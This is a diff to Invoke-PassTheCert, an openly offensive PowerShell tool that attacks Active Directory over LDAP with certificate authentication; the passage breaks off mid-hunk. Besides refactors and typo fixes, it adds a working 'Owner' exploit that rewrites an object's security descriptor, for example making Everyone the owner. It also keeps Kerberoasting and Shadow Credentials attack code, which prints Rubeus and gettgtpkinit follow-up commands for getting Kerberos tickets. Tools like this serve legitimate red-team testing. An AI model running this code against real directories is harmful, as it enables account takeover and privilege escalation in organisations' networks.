@@ -30,7 +30,7 @@ function _ShowBanner {
     Write-Host -ForegroundColor Red     "   _| || | | \ V / (_) |   <  __/ |______|                  "
     Write-Host -ForegroundColor Red     "   \___/_| |_|\_/ \___/|_|\_\___|                           "
     Write-Host -ForegroundColor Red     "                                                            "
-    Write-Host -ForegroundColor Red     "   v1.0.2                                                   "
+    Write-Host -ForegroundColor Red     "   v1.0.3                                                   "
     Write-Host -ForegroundColor Red     "  ______            _____ _          _____           _      "
     Write-Host -ForegroundColor Red     "  | ___ \          |_   _| |        /  __ \         | |     "
     Write-Host -ForegroundColor Red     "  | |_/ /___ ___ ___ | | | |__   ___| /  \/ ___ _ __| |_    "
@@ -71,7 +71,7 @@ function _Helper-ShowHelpOfFunction {
 
             [System.Boolean] 
             
-            Translate a private function's (e.g. `_Filter ...`, `IdentityDN`, `TargetDN`) documentation to the `Invoke-PassTheCert` syntax (e.g. `Invoke-PassTheCert -Action 'Filter' ...`, `Identity`, `Target`) (Optional)
+            Translate a private function's (e.g. `_Filter ...`, `IdentityDN`, `TargetDN`, `ObjectDN`) documentation to the `Invoke-PassTheCert` syntax (e.g. `Invoke-PassTheCert -Action 'Filter' ...`, `Identity`, `Target`, `Object`) (Optional)
             
             - If not specified, defaults to $true.
 
@@ -170,8 +170,8 @@ function _Helper-ShowHelpOfFunction {
         if ($TranslateToInvokePassTheCertSyntax) {
             # Replace all occurrences of '_Action' to: Invoke-PassTheCert -Action 'Action'
             $FunctionHelpString = $FunctionHelpString -replace "_$Action", " Invoke-PassTheCert -Action '$Action'"
-            # Replace all occurrences of '-IdentityDN' (resp. '-TargetDN') to '-Identity' (resp. '-Target'), as they MAY be identities OTHER THAN Distinguished Name.
-            $FunctionHelpString = $FunctionHelpString -replace '-(Identity|Target)DN','-$1'
+            # Replace all occurrences of '-IdentityDN' (resp. '-TargetDN', 'ObjectDN') to '-Identity' (resp. '-Target', 'Object'), as they MAY be identities OTHER THAN Distinguished Name.
+            $FunctionHelpString = $FunctionHelpString -replace '-(Identity|Target|Object)DN','-$1'
             Write-Verbose "[+] Successfully Translated Get-Help Of Type '$HelpType' For Function '$FunctionName' In '$ScriptPath' PowerShell Script To The Invoke-PassTheCert Syntax As:`r`n==========================================`r`n$($FunctionHelpString)`r`n====================================================";
         }
         
@@ -220,10 +220,13 @@ function _Helper-ShowParametersOfFunction {
         [System.Collections.Generic.Dictionary`2[System.String, System.Object]]$PSBoundParameters
     )
 
-    Write-Verbose "[*] Arguments Provided To Function '$FunctionName' Are: $($PSBoundParameters.Keys |ForEach-Object { 
-        "`r`n    [$($PSBoundParameters[$_].GetType())]$($_): $($PSBoundParameters[$_])" }
+    Write-Verbose "[*] Arguments Provided To Function '$FunctionName' Are: $(
+        $PSBoundParameters.Keys |ForEach-Object {
+            if ($PSBoundParameters[$_] -ne $null) {
+                "`r`n    [$($PSBoundParameters[$_].GetType())]$($_): $($PSBoundParameters[$_])" 
+            }
+        }
     )"
-
 }
 
 
@@ -5781,7 +5784,7 @@ function _Helper-ExportRSAPublicKeyBCrypt {
     #>
 
     param(
-        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the certificate from which ro export the BCRYPT_RSAKEY_BLOB")]
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the certificate from which to export the BCRYPT_RSAKEY_BLOB")]
         [System.Security.Cryptography.X509Certificates.X509Certificate2]$Certificate
     )
 
@@ -5837,7 +5840,7 @@ function _Helper-ExportRSAPublicKeyDER {
     #>
 
     param(
-        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the certificate from which ro export the DER format of the RSA public key")]
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the certificate from which to export the DER format of the RSA public key")]
         [System.Security.Cryptography.X509Certificates.X509Certificate2]$Certificate
     )
 
@@ -6508,6 +6511,98 @@ function _Helper-GetDNOfIdentityString {
 }
 
 
+function _Helper-GetReadableValueOfBytes {
+    
+    <#
+    
+        .SYNOPSIS
+
+            Returns the human-readable form of the given bytes array
+
+        .PARAMETER Type
+
+            [System.String]
+
+            The type of the array bytes (among 'objectSid', 'nTSecurityDescriptor', 'objectGuid')
+
+        .PARAMETER ArrayOfBytes
+
+            [byte[]]
+
+            The array of bytes containing the value of the specified type
+
+        .EXAMPLE
+
+            _Helper-GetReadableValueOfBytes -Type 'objectSid' -ArrayOfBytes $Bytes
+
+            Returns the string representation of the given `objectSid` bytes.
+
+        .EXAMPLE
+
+            _Helper-GetReadableValueOfBytes -Type 'nTSecurityDescriptor' -ArrayOfBytes $Bytes
+
+            Returns the object representation of the given `nTSecurityDescriptor` bytes.
+
+        .EXAMPLE
+
+            _Helper-GetReadableValueOfBytes -Type 'objectGuid' -ArrayOfBytes $Bytes
+
+            Returns the string representation of the given `objectGuid` bytes.
+
+        .OUTPUTS
+            
+            The human-readable form of the given bytes array
+
+        .LINK 
+
+            https://learn.microsoft.com/en-us/dotnet/api/system.security.principal.securityidentifier.-ctor
+
+        .LINK 
+
+            https://learn.microsoft.com/en-us/dotnet/api/system.security.accesscontrol.rawsecuritydescriptor.-ctor
+
+        .LINK 
+        
+            https://learn.microsoft.com/en-us/windows/win32/api/guiddef/ns-guiddef-guid
+
+    #>
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the type of the array bytes (among 'objectSid', 'nTSecurityDescriptor', 'objectGuid')")]
+        [ValidateSet('objectSid', 'nTSecurityDescriptor', 'objectGuid')]
+        [System.String]$Type,
+
+        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the array of bytes containing the value of the specified type")]
+        [byte[]]$ArrayOfBytes
+    )
+
+    Write-Verbose "[*] Converting Array Of Bytes Of Type '$Type' Into A Human-Readable Form..."
+
+    if ($Type -eq "objectSid") {
+        $Result = New-Object System.Security.Principal.SecurityIdentifier($ArrayOfBytes, 0)
+        $Result = $Result.Value
+    } elseif ($Type -eq "nTSecurityDescriptor") {
+        $Result = New-Object System.Security.AccessControl.RawSecurityDescriptor($ArrayOfBytes, 0)
+    } elseif ($Type -eq "objectGuid") {
+        # https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1#L8176-L8179
+        # https://unlockpowershell.wordpress.com/2010/07/01/powershell-search-ad-for-a-guid/
+        # Byte order is 4th, 3rd, 2nd, 1st, 6th, 5th, 8th, 7th, 9th, 10th, ...
+        $AOB = $ArrayOfBytes
+        $ArrayOfBytes = @(
+            $AOB[3], $AOB[2], $AOB[1], $AOB[0],
+            $AOB[5], $AOB[4],
+            $AOB[7], $AOB[6]
+        ) + $AOB[8..15]
+        $Result = [Guid]::New([byte[]]$ArrayOfBytes)
+    }
+
+    Write-Verbose "[+] Successfully Converted Array Of Bytes Of Type '$Type' Into A Human-Readable Form !"
+
+    return $Result
+
+}
+
 function _GetAttributeOfObject {
     
     <#
@@ -6596,15 +6691,9 @@ function _GetAttributeOfObject {
         Write-Host "[!] Object '$ObjectDN' Not Found ! Returning `$null..."
         return $null
     } else {
-        # Dealing with edge-cases
-        if ($Attribute -eq "objectSid") {
-            $SIDBytes = $SearchResponse.Entries[0].Attributes[$Attribute][0]
-            $SID = New-Object System.Security.Principal.SecurityIdentifier($SIDBytes, 0)
-            $Result = $SID.Value
-        } elseif ($Attribute -eq "nTSecurityDescriptor") {
-            $SDBytes = $SearchResponse.Entries[0].Attributes[$Attribute][0]
-            $SD = New-Object System.Security.AccessControl.RawSecurityDescriptor($SDBytes, 0)
-            $Result = $SD
+        # Dealing with edge-cases (i.e. attribute containing bytes)
+        if ($Attribute -in @("objectSid", "nTSecurityDescriptor", "objectGuid")) {
+            $Result = _Helper-GetReadableValueOfBytes -Type $Attribute -ArrayOfBytes $SearchResponse.Entries[0].Attributes[$Attribute][0]
         } else {
             $Result = $SearchResponse.Entries[0].Attributes[$Attribute][0]
         }
@@ -6974,31 +7063,35 @@ function _Filter {
 
             [System.String] 
             
-            The Distinguished Name of the Seach Base of the LDAP lookup (e.g. `DC=X`)
+            The Distinguished Name of the Seach Base of the LDAP lookup (e.g. 'DC=X')
+
+            - If not specified, defaults to the LDAP/S Server's domain.
 
         .PARAMETER SearchScope
 
             [System.String] 
             
-            The Seach Base of the LDAP lookup (`Base`, `OneLevel`, or `Subtree`) (default: `Subtree`, i.e. search recursively from the given Search Base)
+            The Seach Base of the LDAP lookup ('Base', 'OneLevel', or 'Subtree').
+            
+            - If not specified, defaults to 'Subtree', i.e. search recursively from the given Search Base)
 
         .PARAMETER Properties
 
             [System.String] 
             
-            The Properties to be returned (e.g. `sAMAccountName,DistinguishedName`) (default: `*`, i.e. return all properties of the returned object(s))
+            The Properties to be returned (e.g. 'sAMAccountName,DistinguishedName') (default: '*', i.e. return all properties of the returned object(s))
 
         .PARAMETER LDAPFilter
 
             [System.String] 
             
-            The LDAP Filter of the LDAP lookup (e.g. `(objectClass=person)`)
+            The LDAP Filter of the LDAP lookup (e.g. '(objectClass=person)')
 
         .PARAMETER UACFilter
 
             [System.String] 
             
-            The UAC Flag(s) (comma-separated, if multiple) or Value to be filtered from the LDAP lookup (e.g. `ACCOUNTDISABLE,NORMAL_ACCOUNT`, or "$(0x0200+0x0002)")
+            The UAC Flag(s) (comma-separated, if multiple) or Value to be filtered from the LDAP lookup (e.g. 'ACCOUNTDISABLE,NORMAL_ACCOUNT', or "$(0x0200+0x0002)")
 
         .PARAMETER DNFilter 
         
@@ -7185,7 +7278,11 @@ function _Filter {
         [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,
 
         [Parameter(Position=1, Mandatory=$false, HelpMessage="Enter the Distinguished Name of the Seach Base of the LDAP lookup")]
-        [System.String]$SearchBase,
+        [PSDefaultValue(Help="Defaulting to an empty string allows to differentiate from an undefined value (hence empty string here), and `$null (specifically used to look for the RootDSE)")]
+        # Not setting its type [System.String] allows to differentiate '' and $null
+        # If we use [System.String]$SearchBase, then we won't be allowed to differentiate when the variable is set to '', or $null => It will always be considered as '', even if unspecified from the command line.
+        # Being able to tell when this parameter is $null (and NOT '') can be handy to differentiate, for instance, if the user specifically request the RootDSE (setting the SearchBase to $null).
+        $SearchBase = '',
         
         [Parameter(Position=2, Mandatory=$false, HelpMessage="Enter the Seach Base of the LDAP lookup (accepted values: 'Base', 'OneLevel', 'Subtree')")]
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
@@ -7214,9 +7311,11 @@ function _Filter {
 
     _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
 
-    # Exception whenever retrieving the RootDSE, i.e. the targeted DN is NULL. 
-    # Note: This scenario makes sense ONLY IF the other filters are NOT set.
-    if (-not $SearchBase) { $SearchBase = $null }
+    # If $SearchBase isn't specified, defaults to the LDAP/S Server's Domain.
+    # Such default value is defined ONLY IF $SearchBase has NOT been specifically set to $null (to look for the RootDSE).
+    if (-not $SearchBase -and $SearchBase -ne $null) {
+        $SearchBase = $(_Helper-GetDomainDNFromDN -DN $(_GetIssuerDNFromLdapConnection -LdapConnection $LdapConnection)) 
+    }
 
     switch ($SearchScope) {
         "Base"      { $SearchScope = [System.DirectoryServices.SearchScope]::Base; break; }
@@ -7244,18 +7343,17 @@ function _Filter {
             $GUIDBytes = ([Guid]$GUIDFilter).ToByteArray();
             # https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1#L8176-L8179
             # https://unlockpowershell.wordpress.com/2010/07/01/powershell-search-ad-for-a-guid/
-            # Byte order is 4th, 3rd, 2nd, 1st, 6th, 5th, 8th, 7th, 9th, ...
+            # Byte order is 4th, 3rd, 2nd, 1st, 6th, 5th, 8th, 7th, 9th, 10th, ...
             $GuidLdapBytes = @(
                 $GUIDBytes[3], $GUIDBytes[2], $GUIDBytes[1], $GUIDBytes[0],
                 $GUIDBytes[5], $GUIDBytes[4],
-                $GUIDBytes[7], $GUIDBytes[6],
-                $GUIDBytes[8], $GUIDBytes[9], $GUIDBytes[10], $GUIDBytes[11], $GUIDBytes[12], $GUIDBytes[13], $GUIDBytes[14], $GUIDBytes[15]
-            )
+                $GUIDBytes[7], $GUIDBytes[6]
+            ) + $GUIDBytes[8..15]
             $GuidLdapFormat = ($GuidLdapBytes |%{ '\{0:X2}' -f $_ }) -join ''
             $MyFilter = "(objectGUID=$GuidLdapFormat)"
         }
         else {
-            Write-Host "[!] GUID Filter '$GUIDFilter' Isn't Valid ! Expected Format: 12345678-1234-1234-1234-123456789012. Returning $null...";
+            Write-Host "[!] GUID Filter '$GUIDFilter' Isn't Valid ! Expected Format: a2345678-A234-b234-B234-c23456789012. Returning $null...";
             return $null
         }
     } else {
@@ -7323,7 +7421,7 @@ function _Filter {
                     #   serviceprincipalname    : CIFS/DC01
                     #                             LDAP/DC01
                     # However, some very long array binaries (e.g. 'usercertificate') are not interesting to split. Hence, we'll whitelist the interesting multi-valued attributes to CRLF-split.
-                    if ($Attribute -in @('objectClass', 'serviceprincipalname', 'memberof', 'msds-keycredentiallink')) {
+                    if ($Attribute -in @('objectClass', 'serviceprincipalname', 'memberof', 'msds-keycredentiallink', 'namingcontexts', 'supportedcontrol', 'supportedsaslmechanisms', 'supportedcapabilities', 'supportedldappolicies', 'certificatetemplates', 'mspki-certificate-application-policy', 'pkicriticalextensions', 'pkiextendedkeyusage', 'pkidefaultcsps')) {
                         $ResultObject | Add-Member -Force -NotePropertyName $Attribute -NotePropertyValue $($AttributeObject -join "`r`n")
                     } else {
                         $ResultObject | Add-Member -Force -NotePropertyName $Attribute -NotePropertyValue $AttributeObject
@@ -7352,8 +7450,21 @@ function _Filter {
         Write-Host "[!] No Entry Found ! Returning `$null..."
         return $null
     } else {
-        # For each result object, translate the UAC Values, if any, into UAC Flags (comma-separacted, if multiple)
-        return $ResultObjects |%{ if ($_.useraccountcontrol) { $_ |Add-Member -Force -NotePropertyName 'useraccountcontrolnames' -NotePropertyValue (_Helper-GetUACFlagsOfValue $_.useraccountcontrol) }; $_ }
+        # For each result object, translate attributes, if applicable.
+        return $ResultObjects |%{ 
+            # Translate UAC Values, if any, into UAC Flags (comma-separacted, if multiple)
+            if ($_.useraccountcontrol) { $_ |Add-Member -Force -NotePropertyName 'useraccountcontrolnames' -NotePropertyValue (_Helper-GetUACFlagsOfValue $_.useraccountcontrol) }; 
+            # Some attributes CANNOT be converted, as they don't hold byte data (e.g. SID of some builtin groups). Therefore, these cases (triggering conversion errors) are NOT translated, and left as is.
+            try {
+                # Translate ObjectSID bytes, if any, into a human-readable string
+                if ($_.objectsid) { $_ |Add-Member -Force -NotePropertyName 'objectsid' -NotePropertyValue (_Helper-GetReadableValueOfBytes -Type 'objectsid' -ArrayOfBytes $_.objectsid) };
+            } catch {}
+            try {
+                # Translate ObjectGUID bytes, if any, into a human-readable string
+                if ($_.objectguid) { $_ |Add-Member -Force -NotePropertyName 'objectguid' -NotePropertyValue (_Helper-GetReadableValueOfBytes -Type 'objectguid' -ArrayOfBytes $_.objectguid) };
+            } catch {}
+            $_
+        }
     }
 }
 
@@ -7591,7 +7702,7 @@ function _CreateObject {
         [Parameter(Position=5, Mandatory=$false, HelpMessage="Enter the password of the object to create (if applicable)")]
         # Not setting its type [System.String] allows to differentiate '' and $null
         # If we use [System.String]$NewPassword, then we won't be allowed to differentiate when the variable is set to '', or $null => It will always be considered as '', even if unspecified from the command line.
-        # Being able to tell when this parameter is $null (ane NOT '') can be handy to differentiate, for instance, if the user wanna create a new computer with a default 120 chars password (i.e. unspecified), or an empty password (i.e. set to '')
+        # Being able to tell when this parameter is $null (and NOT '') can be handy to differentiate, for instance, if the user wanna create a new computer with a default 120 chars password (i.e. unspecified), or an empty password (i.e. set to '')
         $NewPassword
     )
 
@@ -9117,7 +9228,7 @@ function _RemoveValueInAttribute {
         (New-Object System.DirectoryServices.Protocols.ModifyRequest(
             $IdentityDN, 
             [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete, 
-            $Attribute, 
+            $Attribute,
             $Value
         ))
     ) |Out-Null
@@ -9912,9 +10023,15 @@ function _LDAPEnum {
 
             Returns all members (recursively) of the Organizational Unit named `Unity` in the LDAP/S Server's Domain (default SearchBase).
 
+        .EXAMPLE
+
+            _LDAPEnum -LdapConnection $LdapConnection -Enum 'Owner' -ObjectDN 'CN=John JD. DOE,CN=Users,DC=X'
+
+            Returns the owner of the 'John JD. DOE' object in the LDAP/S Server's Domain (default SearchBase).
+
         .OUTPUTS
 
-            [PSCustomObject]{}
+            [PSCustomObject[]]
 
             Enumerated LDAP objects
 
@@ -9943,7 +10060,10 @@ function _LDAPEnum {
         [System.String]$SearchScope = 'Subtree',
         
         [Parameter(Position=3, Mandatory=$false, HelpMessage="Enter the name of the thing to enumerate")]
-        [System.String]$Name
+        [System.String]$Name,
+        
+        [Parameter(Position=4, Mandatory=$false, HelpMessage="Enter the Distinguished Name of the thing to enumerate")]
+        [System.String]$ObjectDN
     )
 
     _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
@@ -10218,7 +10338,6 @@ function _LDAPEnum {
             
             # First degree membership
             $Result = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter "(&(cn=$Name)(|(member=*)(objectClass=group)))"
-            # %{$_ -split "`r`n"} is the reverse operation of multi-valued attributes being automatically -join "`r`n" to conveniently be displayed whenever using |fl. 
             $Result = $Result |Select -ExpandProperty Member | %{ _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter "(distinguishedName=$_)" }
             $Results += $Result
 
@@ -10237,6 +10356,12 @@ function _LDAPEnum {
             if (-not (_Helper-IsEveryValueOfArrayDefined @($Name))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }
             # Not using the OU's DN as a base for search (e.g. 'OU=Unity,DC=X') allows to prevent the user to provide the OU's DN. Instead, the user may only specify 'Unity', Quicky'n'Handy.
             return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope |?{ $_.distinguishedName -like "*,OU=$Name,*" } |Select distinguishedName,sAMAccountName,userAccountControlNames,objectcategory
+        }
+
+        'Owner' {
+            if (-not (_Helper-IsEveryValueOfArrayDefined @($ObjectDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }
+
+            return (_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $ObjectDN -Attribute 'nTSecurityDescriptor').Owner
         }
 
         Default { Write-Host "[!] LDAP Enumeration '$Enum' Not Recognized !"; return }
@@ -10270,7 +10395,7 @@ function _LDAPExploit {
 
         .EXAMPLE
 
-            _LDAPExploit -LdapConnection $LdapConnection -Exploit 'Kerberoasting' -IdentityDN 'CN=SVC SU. USER,CN=Users,DC=X' -SPN 'cifs/FOO'
+            _LDAPExploit -LdapConnection $LdapConnection -Exploit 'Kerberoasting' -TargetDN 'CN=SVC SU. USER,CN=Users,DC=X' -SPN 'cifs/FOO'
 
             Adds the provided `-SPN` (or, if not specified, random) to the specified account's `serviceprincipalname` attribute.
 
@@ -10288,11 +10413,19 @@ function _LDAPExploit {
 
         .EXAMPLE
 
-            _LDAPExploit -LdapConnection $LdapConnection -Exploit 'ShadowCreds' -IdentityDN 'CN=John JD. DOE,CN=Users,DC=X'
+            _LDAPExploit -LdapConnection $LdapConnection -Exploit 'ShadowCreds' -TargetDN 'CN=John JD. DOE,CN=Users,DC=X'
 
             Populates the targeted account `CN=John JD. DOE,CN=Users,DC=X`:`msDS-KeyCredentialLink` attribute with a new self-signed certificate.
 
             - This requires WRITE privileges against the target's `msDS-KeyCredentialLink` attribute.
+
+        .EXAMPLE
+
+            _LDAPExploit -LdapConnection $LdapConnection -Exploit 'Owner' -OwnerSID 'S-1-1-0' -TargetDN 'CN=Kinda KO. OWNED,CN=Users,DC=X'
+
+            Sets the owner of `Kinda KO. OWNED` to the entity with SID `S-1-1-0`. In other words, `Everyone` becomes the owner of `Kinda KO. OWNED`.
+
+            - This requires WRITE privileges against the target's `nTSecurityDescriptor` attribute
 
         .LINK
 
@@ -10316,7 +10449,10 @@ function _LDAPExploit {
         [System.String]$IdentityDN,
 
         [Parameter(Position=4, Mandatory=$false)]
-        [System.String]$TargetDN
+        [System.String]$TargetDN,
+
+        [Parameter(Position=5, Mandatory=$false)]
+        [System.String]$OwnerSID
     )
 
     _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
@@ -10325,15 +10461,15 @@ function _LDAPExploit {
 
         'Kerberoasting' {
             
-            if (-not (_Helper-IsEveryValueOfArrayDefined @($IdentityDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }
+            if (-not (_Helper-IsEveryValueOfArrayDefined @($TargetDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }
 
             if (-not $SPN) { $SPN = "$(_Helper-GetRandomString -Length 4 -Charset 'abcdefghijklmnopqrstuvwxyz')/$(_Helper-GetRandomString -Length 8 -Charset 'abcdefghijklmnopqrstuvwxyz')" }
             
-            Write-Verbose "[*$Exploit*] Trying To Add SPN '$SPN' Into The '$IdentityDN':'serviceprincipalname' Attribute..."
+            Write-Verbose "[*$Exploit*] Trying To Add SPN '$SPN' Into The '$TargetDN':'serviceprincipalname' Attribute..."
             
-            _AddValueInAttribute -LdapConnection $LdapConnection -IdentityDN $IdentityDN -Attribute 'serviceprincipalname' -Value $SPN
+            _AddValueInAttribute -LdapConnection $LdapConnection -IdentityDN $TargetDN -Attribute 'serviceprincipalname' -Value $SPN
 
-            Write-Host "[*$Exploit*] Successfully Added SPN '$SPN' Into The '$IdentityDN':'serviceprincipalname' Attribute !!"
+            Write-Host "[*$Exploit*] Successfully Added SPN '$SPN' Into The '$TargetDN':'serviceprincipalname' Attribute !!"
 
         }
 
@@ -10368,11 +10504,11 @@ function _LDAPExploit {
         
         "ShadowCreds" {
             
-            if (-not (_Helper-IsEveryValueOfArrayDefined @($IdentityDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }
+            if (-not (_Helper-IsEveryValueOfArrayDefined @($TargetDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }
 
             try {
 
-                $sAMAccountName = _Filter -LdapConnection $LdapConnection -SearchBase $IdentityDN -SearchScope Base |Select -ExpandProperty sAMAccountName
+                $sAMAccountName = _Filter -LdapConnection $LdapConnection -SearchBase $TargetDN -SearchScope Base |Select -ExpandProperty sAMAccountName
 
                 # 1. Generate a self-signed certificate and export to file
                 $NewSelfSignedCertificate = _Helper-GenerateSelfSignedCertificate -CN $sAMAccountName
@@ -10464,25 +10600,60 @@ function _LDAPExploit {
                 # 4. Convert into DN With Binary String
                 # https://github.com/MichaelGrafnetter/DSInternals/blob/6fe15cab429f51d91e8b281817fa23b13804456c/Src/DSInternals.Common/Data/Hello/KeyCredential.cs#L512-L516
                 $Hex = ($binaryKeyCredential | ForEach-Object { '{0:X2}' -f $_ }) -join ''
-                $DNWithBinary = "B:$($Hex.Length):$($Hex):$IdentityDN"
+                $DNWithBinary = "B:$($Hex.Length):$($Hex):$TargetDN"
                 
                 # 5. Populate !
-                _AddValueInAttribute -LdapConnection $LdapConnection -IdentityDN $IdentityDN -Attribute 'msDS-KeyCredentialLink' -Value $DNWithBinary
+                _AddValueInAttribute -LdapConnection $LdapConnection -IdentityDN $TargetDN -Attribute 'msDS-KeyCredentialLink' -Value $DNWithBinary
 
                 Write-Host "[*$Exploit*] [Check] Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection `$LdapConnection -Enum 'ShadowCreds'"
-                Write-Host "[*$Exploit*] [Authenticate] gettgtpkinit.py -dc-ip <dc_ip> -cert-pfx '$sAMAccountName.pfx' -pfx-pass '' $(_Helper-GetDomainNameFromDN -DN $IdentityDN)/'$sAMAccountName' './out.ccache'"
-                Write-Host "[*$Exploit*] [Authenticate] Rubeus.exe asktgt /user:'$sAMAccountName' /certificate:'$sAMAccountName.pfx' /password:'' /domain:$(_Helper-GetDomainNameFromDN -DN $IdentityDN) /dc:<dc_ip> /nowrap"
+                Write-Host "[*$Exploit*] [Authenticate] gettgtpkinit.py -dc-ip <dc_ip> -cert-pfx '$sAMAccountName.pfx' -pfx-pass '' $(_Helper-GetDomainNameFromDN -DN $TargetDN)/'$sAMAccountName' './out.ccache'"
+                Write-Host "[*$Exploit*] [Authenticate] Rubeus.exe asktgt /dc:<dc_ip> /user:'$sAMAccountName' /certificate:'$sAMAccountName.pfx' /password:'' /domain:$(_Helper-GetDomainNameFromDN -DN $TargetDN) /nowrap"
 
 
             } catch { 
 
                 Write-Host "[*$Exploit*] [!] Exploitation Failed With Error: $_"; 
-                Write-Host "[*$Exploit*] [*] Hint: Do You Have Write Privileges Against The '$IdentityDN':'msDS-KeyCredentialLink' Attribute ? If Not, You May Execute (If Allowded):"
-                Write-Host "[*$Exploit*] [Grant] Invoke-PassTheCert -Action 'CreateInboundSDDL' -LdapConnection `$LdapConnection -Identity '$(_GetSubjectDNFromLdapConnection -LdapConnection $LdapConnection)' -Target '$IdentityDN' -Attribute 'msDS-KeyCredentialLink' -SDDLACEType 'OA' -SDDLACERights 'RPWP'"
+                Write-Host "[*$Exploit*] [*] Hint: Do You Have Write Privileges Against The '$TargetDN':'msDS-KeyCredentialLink' Attribute ? If Not, You May Execute (If Allowded):"
+                Write-Host "[*$Exploit*] [Grant] Invoke-PassTheCert -Action 'CreateInboundSDDL' -LdapConnection `$LdapConnection -Identity '$(_GetSubjectDNFromLdapConnection -LdapConnection $LdapConnection)' -Target '$TargetDN' -Attribute 'msDS-KeyCredentialLink' -SDDLACEType 'OA' -SDDLACERights 'RPWP'"
                 return
 
             }
             
+        }
+
+        "Owner" {
+            
+            if (-not (_Helper-IsEveryValueOfArrayDefined @($OwnerSID, $TargetDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }
+
+            Write-Verbose "[*$Exploit*] Setting '$OwnerSID' As Owner Of Target '$TargetDN'..."
+            
+            # Locally editing the target's nTSecurityDescriptor's owner
+            $SD = _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $TargetDN -Attribute 'nTSecurityDescriptor'
+            $SD.Owner = [System.Security.Principal.SecurityIdentifier]::new(
+                $OwnerSID
+            )
+            $NewSD = New-Object byte[] $SD.BinaryLength
+            $SD.GetBinaryForm($NewSD, 0)
+
+            # Pushing the modification to LDAP
+            $Modification = New-Object System.DirectoryServices.Protocols.ModifyRequest(
+                $TargetDN,
+                [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace,
+                'nTSecurityDescriptor'
+            )
+            $Modification.Controls.Add(
+                (New-Object System.DirectoryServices.Protocols.SecurityDescriptorFlagControl(
+                    [System.DirectoryServices.Protocols.SecurityMasks]::Owner
+                ))
+            ) |Out-Null
+            $Modification.Modifications[0].Add($NewSD) |Out-Null
+            $LdapConnection.SendRequest(
+                $Modification
+            ) |Out-Null
+
+            Write-Host "[*$Exploit*] [+] Successfully Set '$OwnerSID' As Owner Of Target '$TargetDN' !"
+            Write-Host "[*$Exploit*] [Check] Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection `$LdapConnection -Enum 'Owner' -Object '$TargetDN'"
+
         }
 
         Default { Write-Host "[!] LDAP Exploitation '$Exploit' Not Recognized !"; return }
@@ -11084,7 +11255,11 @@ function Invoke-PassTheCert {
         [System.Int32]$Port = 636,
 
         [Parameter(Position=6, Mandatory=$false, HelpMessage="Enter the Distinguished Name of the Seach Base of the LDAP lookup")]
-        [System.String]$SearchBase,
+        [PSDefaultValue(Help="Defaulting to an empty string allows to differentiate from an undefined value (hence empty string here), and `$null (specifically used to look for the RootDSE)")]
+        # Not setting its type [System.String] allows to differentiate '' and $null
+        # If we use [System.String]$SearchBase, then we won't be allowed to differentiate when the variable is set to '', or $null => It will always be considered as '', even if unspecified from the command line.
+        # Being able to tell when this parameter is $null (and NOT '') can be handy to differentiate, for instance, if the user specifically request the RootDSE (setting the SearchBase to $null).
+        $SearchBase = '',
         
         [Parameter(Position=7, Mandatory=$false, HelpMessage="Enter the Seach Base of the LDAP lookup (accepted values: 'Base', 'OneLevel', 'Subtree')")]
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
@@ -11110,97 +11285,100 @@ function Invoke-PassTheCert {
         [Parameter(Position=13, Mandatory=$false, HelpMessage="Enter SID to be filtered from the LDAP lookup")]
         [System.String]$SIDFilter,
 
-        [Parameter(Position=15, Mandatory=$false, HelpMessage="Enter the old password of the certificate-authenticated user (if applicable, i.e. if the LDAP/S Server's policy requires it)")]
+        [Parameter(Position=14, Mandatory=$false, HelpMessage="Enter the old password of the certificate-authenticated user (if applicable, i.e. if the LDAP/S Server's policy requires it)")]
         [System.String]$OldPassword,
 
-        [Parameter(Position=16, Mandatory=$false, HelpMessage="Enter the new password to set")]
+        [Parameter(Position=15, Mandatory=$false, HelpMessage="Enter the new password to set")]
         # Not setting its type [System.String] allows to differentiate '' and $null
         # If we use [System.String]$NewPassword, then we won't be allowed to differentiate when the variable is set to '', or $null => It will always be considered as '', even if unspecified from the command line.
         # Being able to tell when this parameter is $null (and NOT '') can be handy to differentiate, for instance, if the user wanna create a new computer with a default password (i.e. unspecified), or an empty password (i.e. set to '')
         $NewPassword,
 
-        [Parameter(Position=17, Mandatory=$false, HelpMessage="Enter the attribute to be processed")]
